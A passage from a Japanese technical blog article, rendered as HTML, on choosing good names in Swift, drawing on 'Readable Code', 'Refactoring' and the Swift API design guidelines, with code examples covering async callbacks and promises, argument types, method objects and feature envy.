<span class="kd">let</span> <span class="nv">decodedText</span> <span class="p">=</span> <span class="n">encodedText</span><span class="p">.</span><span class="n">removingPercentEncoding</span><span class="p">!</span> <span class="c1">// "100%勇気"</span>
<span class="c1">// もう👆はdecode済みだとわかる</span>
</pre></div></div>

<p>悪い例では、text1,2,3という変数名のため、どれがデコードされたものかわかりません。<br>
良い例では、変数名にencoded, decodedという接頭辞をつけることで、その意味が明確になりました。</p>

<hr>

<h3>
<span id="名前に情報を詰め込む名前の長さを決める" class="fragment"></span><a href="#%E5%90%8D%E5%89%8D%E3%81%AB%E6%83%85%E5%A0%B1%E3%82%92%E8%A9%B0%E3%82%81%E8%BE%BC%E3%82%80%E5%90%8D%E5%89%8D%E3%81%AE%E9%95%B7%E3%81%95%E3%82%92%E6%B1%BA%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>「名前に情報を詰め込む」⑤名前の長さを決める</h3>

<p>5番目のテクニック、「名前の長さを決める」です。</p>

<p><code>NSLayoutManager</code> には、 <code>func drawStrikethrough(forGlyphRange glyphRange: NSRange, strikethroughType strikethroughVal: NSUnderlineStyle, baselineOffset: CGFloat, lineFragmentRect lineRect: CGRect, lineFragmentGlyphRange lineGlyphRange: NSRange, containerOrigin: CGPoint)</code> というメソッドがあります。目眩を覚える長さです。少しでも短くなるように努力すべきでしょうか。たとえば Gryph という単語が頻出するので、それを <code>Gp</code> などと略せば文字数を減らせそうです。<br>
しかし、リーダブルコードによれば、それは否です。長い名前の入力自体は問題ではありません。IDEのコード補完に任せれば一文字のミスもなく入力できるからです。名前に読みづらいだけの省略形を使う意味はありません。避けましょう。</p>

<p>かといって、名前を冗長にしろということではありません。リーダブルコードは「不要な単語を投げ捨てろ」と断じています。<br>
Swift の 2 から 3 にかけてのAPIの変化は、まさに、不要な単語を投げ捨てるものでした。</p>

<p><a href="https://camo.qiitausercontent.com/74401167fc2363dd39c74295a3de28fde893c5d5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33343430352f37663364363634632d333337662d323061382d303962662d6461633733633939326530302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/74401167fc2363dd39c74295a3de28fde893c5d5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33343430352f37663364363634632d333337662d323061382d303962662d6461633733633939326530302e706e67" alt="swift2.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/34405/7f3d664c-337f-20a8-09bf-dac73c992e00.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/8bc365afb24fdd1c9b5432f3f2b1fc2f949dfe83/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33343430352f39623763303735382d663631312d663965612d363330352d3839376565623536343532382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8bc365afb24fdd1c9b5432f3f2b1fc2f949dfe83/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33343430352f39623763303735382d663631312d663965612d363330352d3839376565623536343532382e706e67" alt="swift3.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/34405/9b7c0758-f611-f9ea-6305-897eeb564528.png"></a></p>

<p>Swift2での長ったらしいメソッド名は、Swift3では、こんなふうに変わりました。劇的ですね。ラベルでの意味の補強も合わせて、とても書きやすいものになりました。見倣いましょう。</p>

<hr>

<h3>
<span id="名前に情報を詰め込む名前のフォーマットで情報を伝える" class="fragment"></span><a href="#%E5%90%8D%E5%89%8D%E3%81%AB%E6%83%85%E5%A0%B1%E3%82%92%E8%A9%B0%E3%82%81%E8%BE%BC%E3%82%80%E5%90%8D%E5%89%8D%E3%81%AE%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%83%E3%83%88%E3%81%A7%E6%83%85%E5%A0%B1%E3%82%92%E4%BC%9D%E3%81%88%E3%82%8B"><i class="fa fa-link"></i></a>「名前に情報を詰め込む」⑥名前のフォーマットで情報を伝える</h3>

<p>最後のテクニックは名前のフォーマットについてのものですが、Swiftではあまり使われないものですね。<br>
「大文字始まりは型名、それ以外は小文字始まり」というざっくりしたルールがある程度です。ただ、「アンダースコア始まりのAPIはpublicなものではない」ということは覚えておくと良いことが時々ありそうです。<br>
たとえば、 <code>_kvcKeyPathString</code> というAPIがあります。<a href="https://bugs.swift.org/browse/SR-5220" rel="nofollow noopener" target="_blank">privateなものなので、publicにしてくれというバグレポが出ている</a>のですが、これがpublicではないと気付けるのは名前のフォーマットのおかげですね。</p>

<hr>

<h3>
<span id="名前に情報を詰め込むまとめ" class="fragment"></span><a href="#%E5%90%8D%E5%89%8D%E3%81%AB%E6%83%85%E5%A0%B1%E3%82%92%E8%A9%B0%E3%82%81%E8%BE%BC%E3%82%80%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>「名前に情報を詰め込む」まとめ</h3>

<p>以上が「名前に情報を詰め込む」でした。</p>

<ol>
<li>明確な単語を選ぶ</li>
<li>汎用的な名前を避ける（あるいは、使う状況を選ぶ）</li>
<li>抽象的な名前よりも具体的な名前を使う</li>
<li>接尾辞や接頭辞を使って情報を追加する</li>
<li>名前の長さを決める</li>
<li>名前のフォーマットで情報を伝える</li>
</ol>

<p>以上6つのテクニックで、適切なネーミングには大きく近づけました。</p>

<hr>

<h2>
<span id="リファクタリングより" class="fragment"></span><a href="#%E3%83%AA%E3%83%95%E3%82%A1%E3%82%AF%E3%82%BF%E3%83%AA%E3%83%B3%E3%82%B0%E3%82%88%E3%82%8A"><i class="fa fa-link"></i></a>「リファクタリング」より</h2>

<p>「リファクタリング」もいいこと言ってましたので、引用します。<sup id="fnref1"><a href="#fn1" rel="footnote" title="「新装版　リファクタリング　既存のコードを安全に改善する」2014年 P77">1</a></sup></p>

<blockquote>
<p>メソッド名には、内部でどのように処理をしているかでなく、そのコードが何をするのかという意図を示します。<br>
置き換えによって、以前よりコードが長くなったとしても、意図が明確になっていれば良しとします。ここで重要なことは、メソッドの長さを切り詰めるのではなく、メソッド名と、その実装との距離を埋めることだからです。</p>
</blockquote>

<p>たとえば、 <code>User</code> が格納されている配列から最初の3要素を取得する処理を、 <code>firstThreeUsers</code> とするのではなく <code>usersForFirstView</code> とする…というような感じでしょうか。</p>

<hr>

<h2>
<span id="swift-の-api-design-guideline-に従う" class="fragment"></span><a href="#swift-%E3%81%AE-api-design-guideline-%E3%81%AB%E5%BE%93%E3%81%86"><i class="fa fa-link"></i></a>Swift の API design guideline に従う</h2>

<p>また、Swiftを書くなら重要なのは、<a href="https://swift.org/documentation/api-design-guidelines/#naming" rel="nofollow noopener" target="_blank">SwiftのAPI design guideline</a>に従うことです。<br>
抜粋すると、</p>

<ul>
<li>流暢な英文に見えるように</li>
<li>変数・引数・付属型のネーミングは、その制約よりも<strong>役割</strong>に応じて行う</li>
<li>メソッド名の品詞を、副作用あるなしで変化させる

<ul>
<li>副作用なし: 名詞、動詞の過去分詞、現在分詞を使う

<ul>
<li>e.g. <code>array.sorted</code>
</li>
</ul>
</li>
<li>副作用あり: 動詞の命令形を使う。あるいは <code>form</code> を頭につける

<ul>
<li>e.g. <code>array.sort</code> 　/　 <code>y.formUnion()</code>
</li>
</ul>
</li>
</ul>
</li>
<li>前例を採用しましょう</li>
<li>etc... </li>
</ul>

<p>他にも重要な記述ばかりですので、まずは全員原文を読みましょう。日本語じゃないと嫌！という人は、最近Qiitaに日本語訳も上がっていました。</p>

<p><a href="https://qiita.com/yamoridon/items/b89a18a037631b6770b9" id="reference-aafcdfdec3b58afd5b46">Swift API デザインガイドライン - Qiita</a></p>

<hr>

<h2>
<span id="swift-foundation--cocoaの流儀に従う" class="fragment"></span><a href="#swift-foundation--cocoa%E3%81%AE%E6%B5%81%E5%84%80%E3%81%AB%E5%BE%93%E3%81%86"><i class="fa fa-link"></i></a>Swift Foundation / Cocoaの流儀に従う</h2>

<p>APIガイドラインに「前例を採用しましょう」とあったとおり、SwiftのFoundationやCocoaのAPI名になるべく近づけることも大事です。<br>
プログラマの間では、Boolの命名についてよく議論になったりします。be動詞ではない場合にどうするか、たとえば <code>exists</code> にするか、文法的におかしくても <code>isExist</code> にするか、 <code>is</code> も省略するか、などの論争が起こりがちです。しかし他の言語ではともかく、Swiftであれば<strong>「be動詞ならisつけましょう、一般動詞なら三人称単数現在にしましょう、あるいは <code>can〜</code> 、<code>needs〜</code> などで始めましょう」</strong>という一択です。<br>
あるいは、delegateメソッドの名付けでは、よく委譲元の型名が省略されているコードを見かけます。しかし、Cocoaの流儀に則れば、委譲元が明示される命名規則に辿り着くことができます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ❌️</span>
<span class="kd">func</span> <span class="nf">willBlog</span><span class="p">(</span><span class="kc">_</span> <span class="n">blog</span><span class="p">:</span> <span class="n">Blog</span><span class="p">)</span>

<span class="c1">// ⭕️</span>
<span class="kd">func</span> <span class="nf">atendeeWillBlog</span><span class="p">(</span><span class="kc">_</span> <span class="n">blog</span><span class="p">:</span> <span class="n">Blog</span><span class="p">)</span>
</pre></div></div>

<p>どういった名付けがスタンダードなんだっけ？　と迷ったときのためには、Appleのリファレンスを簡単に検索できるようにしておくと便利です。自分は<a href="https://kapeli.com/dash" rel="nofollow noopener" target="_blank">Dash</a>というドキュメント検索アプリを活用したり、ランチャーアプリの<a href="https://www.alfredapp.com/%08" rel="nofollow noopener" target="_blank">Alfred</a>で <code>https://developer.apple.com/search/?q={query}&amp;type=Reference</code> というクエリを即座に呼び出せるようにしています。</p>

<h1>
<span id="そもそも適切なネーミングができない例もある" class="fragment"></span><a href="#%E3%81%9D%E3%82%82%E3%81%9D%E3%82%82%E9%81%A9%E5%88%87%E3%81%AA%E3%83%8D%E3%83%BC%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%8C%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84%E4%BE%8B%E3%82%82%E3%81%82%E3%82%8B"><i class="fa fa-link"></i></a>そもそも適切なネーミングができない例もある</h1>

<p>以上、紹介したような手段でネーミングは完璧！と言いたいところですが、小手先のネーミングテクニックだけではしっくりこないことも多いです。<br>
そんな例を2つほどご紹介します。</p>

<h2>
<span id="適切なネーミングができない例非同期処理" class="fragment"></span><a href="#%E9%81%A9%E5%88%87%E3%81%AA%E3%83%8D%E3%83%BC%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%8C%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84%E4%BE%8B%E9%9D%9E%E5%90%8C%E6%9C%9F%E5%87%A6%E7%90%86"><i class="fa fa-link"></i></a>適切なネーミングができない例①非同期処理</h2>

<p>まずは、先程リーダブルコードの説明のときに例に出したコードを見てみましょう。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">HogeListViewController</span> <span class="p">:</span> <span class="bp">UIViewController</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">startFetchingHogesWithFailureAlert</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">fetchHoges</span><span class="p">(</span><span class="n">withID</span><span class="p">:</span> <span class="n">textField</span><span class="p">.</span><span class="n">text</span><span class="p">!,</span>
                   <span class="n">showsAlertIfFailed</span><span class="p">:</span> <span class="kc">true</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="kd">func</span> <span class="nf">startFetchingHogesWithoutFailureAlert</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">fetchHoges</span><span class="p">(</span><span class="n">withID</span><span class="p">:</span> <span class="n">textField</span><span class="p">.</span><span class="n">text</span><span class="p">!,</span>
                   <span class="n">showsAlertIfFailed</span><span class="p">:</span> <span class="kc">false</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="kd">func</span> <span class="nf">fetchHoges</span><span class="p">(</span><span class="n">withID</span> <span class="n">id</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">showsAlertIfFailed</span><span class="p">:</span> <span class="nb">Bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">api</span><span class="p">.</span><span class="n">fetchHoges</span><span class="p">(</span><span class="n">withID</span><span class="p">:</span> <span class="n">id</span><span class="p">)</span> <span class="p">{</span> <span class="p">[</span><span class="kr">weak</span> <span class="kc">self</span><span class="p">]</span> <span class="n">hoges</span> <span class="k">in</span>
            <span class="kc">self</span><span class="p">?.</span><span class="n">didReceive</span><span class="p">(</span>
                <span class="n">hoges</span><span class="p">:</span> <span class="n">hoges</span><span class="p">,</span>
                <span class="n">showsAlertIfFailed</span><span class="p">:</span> <span class="n">showsAlertIfFailed</span>
            <span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div></div>

<p>小手先のネーミングで、最初よりはだいぶマシになりました。しかし、これ、正直言うと、違和感が残ります。どこかというと、これです。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">fetchHoges</span><span class="p">(</span><span class="n">withID</span> <span class="n">id</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">showsAlertIfFailed</span><span class="p">:</span> <span class="nb">Bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">api</span><span class="p">.</span><span class="n">fetchHoges</span><span class="p">(</span><span class="n">withID</span><span class="p">:</span> <span class="n">id</span><span class="p">)</span> <span class="p">{</span> <span class="p">[</span><span class="kr">weak</span> <span class="kc">self</span><span class="p">]</span> <span class="n">hoges</span> <span class="k">in</span>
        <span class="kc">self</span><span class="p">?.</span><span class="n">didReceive</span><span class="p">(</span>
            <span class="n">hoges</span><span class="p">:</span> <span class="n">hoges</span><span class="p">,</span>
            <span class="n">showsAlertIfFailed</span><span class="p">:</span> <span class="n">showsAlertIfFailed</span>
        <span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>fetchしてから、受け取ったデータを <code>didReceive</code> というメソッドに渡す。でも、この「受け取ったものをどうする」という情報が、<code>fetchHoges</code> というメソッド名だけではまったく伝わらないのです。引数に何かフラグはあるけど、失敗時に他にやってることは何なのか、成功時にはどうしてるのか、何も分からない。<br>
どうネーミングを頑張っても、この違和感は解決できません。何故こんなしっくりしない現象が起きてしまうのか。それは、<strong>構造化プログラミングの大原則に起因します</strong>。<br>
構造化プログラミングでは、原則として、メソッドは <code>入口(引数)</code> と <code>出口(戻り値)</code> を持ちます。しかし非同期処理を愚直に書くと、戻り値には反映されない処理が、メソッドに混ざってしまう。そうすると必然的に、メソッド名と処理内容は乖離してしまいます。<br>
非同期処理は、根本的にそういう問題を孕んでいるのです。<br>
ではどうするか。<br>
非同期処理の結果を、なんらかの手段を使って<strong>引数か戻り値で受けるようにしてしまえばいい</strong>のです。そのために使えるのが、 コールバックやPromiseパターンといったデザインパターンです。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// 🤔</span>
<span class="kd">func</span> <span class="nf">fetchHoges</span><span class="p">(</span><span class="n">withID</span> <span class="n">id</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">showsAlertIfFailed</span><span class="p">:</span> <span class="nb">Bool</span><span class="p">)</span>


<span class="c1">// 👍callback</span>
<span class="kd">func</span> <span class="nf">fetchHoges</span><span class="p">(</span><span class="n">withID</span> <span class="n">id</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">completion</span><span class="p">:</span> <span class="p">([</span><span class="n">Hoge</span><span class="p">]</span> <span class="p">-&gt;</span> <span class="nb">Void</span><span class="p">))</span>

<span class="c1">// 💯promise</span>
<span class="kd">func</span> <span class="nf">fetchHoges</span><span class="p">(</span><span class="n">withID</span> <span class="n">id</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">RxSwift</span><span class="p">.</span><span class="n">Single</span><span class="o">&lt;</span><span class="p">[</span><span class="n">Hoge</span><span class="p">]</span><span class="o">&gt;</span>
</pre></div></div>

<p><code>fetchHoges</code> メソッドではHogesをfetchする以外のことは行わない。fetchの結果は、メソッドの外でハンドリングするようにしましょう。コールバックなら <code>completion</code> というクロージャを引数に含める。Promiseパターンなら、結果の取得を監視するための型を、戻り値で受け取る。<br>
これで、ネーミングと処理内容が一致しました。<br>
ちなみに引数を使ったコールバックよりも、戻り値を使ったPromiseパターンのほうが優れています。なぜなら、コールバック関数は呼び忘れるリスクがありますが、戻り値は絶対に返ってくることがコンパイラレベルで保証されるからです。</p>

<h2>
<span id="適切なネーミングができない例引数の表現力が弱い" class="fragment"></span><a href="#%E9%81%A9%E5%88%87%E3%81%AA%E3%83%8D%E3%83%BC%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%8C%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84%E4%BE%8B%E5%BC%95%E6%95%B0%E3%81%AE%E8%A1%A8%E7%8F%BE%E5%8A%9B%E3%81%8C%E5%BC%B1%E3%81%84"><i class="fa fa-link"></i></a>適切なネーミングができない例②引数の表現力が弱い</h2>

<p>以下のメソッドを見てください。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">postProfileWith</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">String</span><span class="p">?,</span>
                     <span class="n">address</span><span class="p">:</span> <span class="nb">String</span><span class="p">?,</span>
                     <span class="n">tel</span><span class="p">:</span> <span class="nb">String</span><span class="p">?,</span>
                     <span class="n">profileImage</span><span class="p">:</span> <span class="bp">UIImage</span><span class="p">?,</span>
                     <span class="n">profileImageURL</span><span class="p">:</span> <span class="n">URL</span><span class="p">?)</span>
                     <span class="p">-&gt;</span> <span class="n">RxSwift</span><span class="p">.</span><span class="n">Single</span><span class="p">&lt;</span><span class="nb">Bool</span><span class="p">&gt;</span>
</pre></div></div>

<p>おそらくプロフィール情報をAPIにPOSTするメソッドなのでしょう。<br>
短くて意図が明確、シンプルで分かりやすい…と思われたでしょうか。<br>
本当に、そうでしょうか？<br>
メソッド基部だけ見れば、シンプルです。しかし、引数まで注目してみると…よくわからないことだらけです。</p>

<ul>
<li>Optionalばかりだけど、必須パラメータは何なのか</li>
<li>tel ☎️ はどういうフォーマットで文字列化すればいいのか</li>
<li>何故 <code>profileImage</code> と <code>profileImageURL</code> が両方あるのか。どちらも渡したら、あるいはどちらも渡さなかったらどうなるのか。</li>
</ul>

<p>そう、このメソッドは、引数の表現力が弱すぎるのです。<br>
お分かりでしょうか。引数もネーミングの内です（もちろん戻り値も）。メソッドをよりよく名付けるためには、基部だけではなく、引数の表現力を高める必要があります。<br>
以下のようにすると、どうでしょうか。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">postProfileWith</span><span class="p">(</span><span class="n">textData</span><span class="p">:</span> <span class="n">ProfileTextData</span><span class="p">?,</span>
                     <span class="n">imageData</span><span class="p">:</span> <span class="n">ProfileImageData</span><span class="p">)</span>
                     <span class="p">-&gt;</span> <span class="n">RxSwift</span><span class="p">.</span><span class="n">Single</span><span class="p">&lt;</span><span class="nb">Bool</span><span class="p">&gt;</span>
</pre></div></div>

<p>大量にあった引数を、ふたつの独自型、 <code>ProfileTextData</code> , <code>ProfileImageData</code> という型を作って整理しました。<br>
 <code>ProfileImageData</code> のほうはOptionalすらなくなっていますね。<br>
型の定義を見てみると、</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">struct</span> <span class="nc">ProfileTextData</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nv">name</span><span class="p">:</span> <span class="nb">String</span>
    <span class="kd">let</span> <span class="nv">address</span><span class="p">:</span> <span class="nb">String</span>
    <span class="kd">let</span> <span class="nv">tel</span><span class="p">:</span> <span class="n">Tel</span><span class="p">?</span>
<span class="p">}</span>

<span class="kd">enum</span> <span class="nc">ProfileImageData</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">image</span><span class="p">(</span><span class="bp">UIImage</span><span class="p">)</span>
    <span class="k">case</span> <span class="n">url</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
<span class="p">}</span>
</pre></div></div>

<p><code>ProfileTextData</code> はテキストで表されるプロフィールのデータの組のようです。structで包むことで、必要なデータが揃っていること、つまり<strong>要素のAND条件</strong>を型として表現できました。<br>
また、 <code>ProfileImageData</code> のほうはenumで包まれています。UIImageか、URLか。いずれかの要素があればいいということ、つまり<strong>要素のOR条件</strong>を、型として表現できました。<br>
型の定義を理解すると、メソッドの意図が明確に伝わるようになりました。 <code>postProfile</code> メソッドに渡す引数は2つ。<br>
 <code>ProfileTextData</code> はname,address,telを揃えて渡すか、完全にスルーする。 <code>ProfileImageData</code> は、UIImageかURLの、いずれかを引数にする。なるほど、明確ですね！</p>

<h1>
<span id="リファクタリング" class="fragment"></span><a href="#%E3%83%AA%E3%83%95%E3%82%A1%E3%82%AF%E3%82%BF%E3%83%AA%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a>リファクタリング</h1>

<h2>
<span id="適切な名前を考える--設計の見直し" class="fragment"></span><a href="#%E9%81%A9%E5%88%87%E3%81%AA%E5%90%8D%E5%89%8D%E3%82%92%E8%80%83%E3%81%88%E3%82%8B--%E8%A8%AD%E8%A8%88%E3%81%AE%E8%A6%8B%E7%9B%B4%E3%81%97"><i class="fa fa-link"></i></a>適切な名前を考える ⊃ 設計の見直し</h2>

<p>非同期通信の例、postProfileの例。<br>
ふたつの例をご紹介しましたとおり、適切な名前を考えるためには、ときには設計を見直すことも必要です。つまり、ネーミングの改善に必要なのは、リファクタリングです。<br>
しっかりした名前をつけようとすると長くなるとか、うまく名付けられないとかで、不正確に要約してしまいたくなることが時々あります。しかし、それは現実から目を背け、設計の問題を隠蔽しているだけです。<br>
やってることが複雑すぎて一言で言い表せないメソッドがあった場合、それは設計の黄信号。リファクタリングが必要だというサインなのです。<br>
ではここからは、本「<a href="https://www.amazon.co.jp/dp/427405019X" rel="nofollow noopener" target="_blank">新装版 リファクタリング―既存のコードを安全に改善する―</a>」を引用しつつ、よりよいネーミングに向かうためのテクニックをご紹介します。</p>

<h2>
<span id="引数を型にまとめる" class="fragment"></span><a href="#%E5%BC%95%E6%95%B0%E3%82%92%E5%9E%8B%E3%81%AB%E3%81%BE%E3%81%A8%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>「引数を型にまとめる」</h2>

<p>種明かしすると、実は先程話した、引数をまとめた型を作るテクニックも、「リファクタリング」に紹介されているテクニックのひとつです。</p>

<h2>
<span id="メソッドオブジェクト" class="fragment"></span><a href="#%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88"><i class="fa fa-link"></i></a>「メソッドオブジェクト」</h2>

<p>また、メソッドオブジェクトというアプローチもあります。端的に言うと、以下のようなテクニックです。</p>

<ul>
<li>メソッド自身 → 名詞化して型(オブジェクト) に</li>
<li>全てのローカル変数 → 型のプロパティ に</li>
<li>メソッド → 型内のメソッド群 に</li>
</ul>

<p>先程の事例だった <code>postProfile</code> というメソッドを、メソッドオブジェクト化してみましょう。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">ProfilePoster</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nv">textData</span><span class="p">:</span> <span class="n">ProfileTextData</span><span class="p">?</span>
    <span class="kd">let</span> <span class="nv">imageData</span><span class="p">:</span> <span class="n">ProfileImageData</span>

    <span class="kd">func</span> <span class="nf">run</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">RxSwift</span><span class="p">.</span><span class="n">Single</span><span class="p">&lt;</span><span class="nb">Bool</span><span class="p">&gt;</span>

    <span class="kd">private</span> <span class="kd">func</span> <span class="p">...</span>
<span class="p">}</span>
</pre></div></div>

<p>「リファクタリング」ではメソッド名を <code>compute</code> としろと言っていましたが、そこは別に好きにすりゃいいんじゃないかと思います。</p>

<h2>
<span id="特性の横恋慕" class="fragment"></span><a href="#%E7%89%B9%E6%80%A7%E3%81%AE%E6%A8%AA%E6%81%8B%E6%85%95"><i class="fa fa-link"></i></a>「特性の横恋慕」</h2>

<p>「リファクタリング」P80に、次のような記述があります。</p>

<blockquote>
<p>オブジェクト指向には、処理および処理に必要なデータを1つにまとめてしまうという重要な考え方があります。あるメソッドが、自分のクラスよりも他のクラスに興味を持つような場合には、古典的な誤りを犯しています。特に属性については注意しなければなりません。</p>
</blockquote>

<p>以下のコードを見てください。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ❌️</span>
<span class="kd">class</span> <span class="nc">ProfilePoster</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="kd">private</span> <span class="kd">func</span> <span class="nf">isTelValid</span><span class="p">(</span><span class="n">tel</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="nb">Bool</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span><span class="k">try</span><span class="p">!</span> <span class="bp">NSRegularExpression</span><span class="p">(</span><span class="n">pattern</span><span class="p">:</span> <span class="s">"^[0-9]+-[0-9]+-[0-9]+$"</span><span class="p">))</span>
            <span class="p">.</span><span class="n">firstMatch</span><span class="p">(</span><span class="k">in</span><span class="p">:</span> <span class="n">tel</span><span class="p">,</span>
                        <span class="n">range</span><span class="p">:</span> <span class="n">NSRange</span><span class="p">(</span><span class="n">location</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">:</span> <span class="p">(</span><span class="n">tel</span> <span class="k">as</span> <span class="bp">NSString</span><span class="p">).</span><span class="n">length</span><span class="p">))</span> <span class="o">!=</span> <span class="kc">nil</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>メソッドオブジェクト <code>ProfilePoster</code> を実行する間、いくつか処理が呼ばれているとします。そのうちのひとつが、電話番号のバリデーションを行うプライベートメソッド、 <code>isTelValid(tel:)</code> です。しかし、このメソッドは、ProfileをPostすること自体には興味がありません。興味があるのは、電話番号それ自身。<br>
これが横恋慕状態です。<br>
解決するためには、新しい型、電話番号に興味を持つ型を用意する必要があります。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ⭕️</span>
<span class="kd">extension</span> <span class="nc">NSRange</span> <span class="p">{</span>
    <span class="kd">static</span> <span class="kd">func</span> <span class="nf">wholeRange</span><span class="p">(</span><span class="k">for</span> <span class="n">string</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">NSRange</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">NSRange</span><span class="p">(</span><span class="n">location</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">:</span> <span class="p">(</span><span class="n">string</span> <span class="k">as</span> <span class="bp">NSString</span><span class="p">).</span><span class="n">length</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kd">extension</span> <span class="nc">String</span> <span class="p">{</span>
    <span class="kd">func</span> <span class="nf">matches</span><span class="p">(</span><span class="n">pattern</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="nb">Bool</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">try</span> <span class="bp">NSRegularExpression</span><span class="p">(</span><span class="n">pattern</span><span class="p">:</span> <span class="n">pattern</span><span class="p">)</span>
            <span class="p">.</span><span class="n">firstMatch</span><span class="p">(</span><span class="k">in</span><span class="p">:</span> <span class="kc">self</span><span class="p">,</span> <span class="n">range</span><span class="p">:</span> <span class="p">.</span><span class="n">wholeRange</span><span class="p">(</span><span class="k">for</span><span class="p">:</span> <span class="kc">self</span><span class="p">))</span> <span class="o">!=</span> <span class="kc">nil</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kd">struct</span> <span class="nc">Tel</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nv">value</span><span class="p">:</span> <span class="nb">String</span>
    <span class="kd">var</span> <span class="nv">isValid</span><span class="p">:</span> <span class="nb">Bool</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">try</span><span class="p">!</span> <span class="n">value</span><span class="p">.</span><span class="n">matches</span><span class="p">(</span><span class="n">pattern</span><span class="p">:</span> <span class="s">"^[0-9]+-[0-9]+-[0-9]+$"</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>横恋慕が収まりました。それだけでなく、ネーミングの点でも良いことをもたらすのがおわかりでしょうか。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// 🤔before🤔</span>
<span class="n">ProfilePoster</span><span class="p">.</span><span class="n">isTelValid</span><span class="p">(</span><span class="n">tel</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="nb">Bool</span>

<span class="c1">// 🎉after🎉</span>
<span class="n">Tel</span><span class="p">.</span><span class="n">isValid</span><span class="p">:</span> <span class="nb">Bool</span>
</pre></div></div>

<p>元々のメソッド名が長ったらしかったのに対し、移動した後のcomputed varはシンプルで明瞭です。<br>
主語となる型に処理を託すことで、処理対象を型自身が説明してくれる上に、対象がselfとなるぶん、渡さなければいけなかった引数も消えます。良いことづくめですね。</p>

<h3>
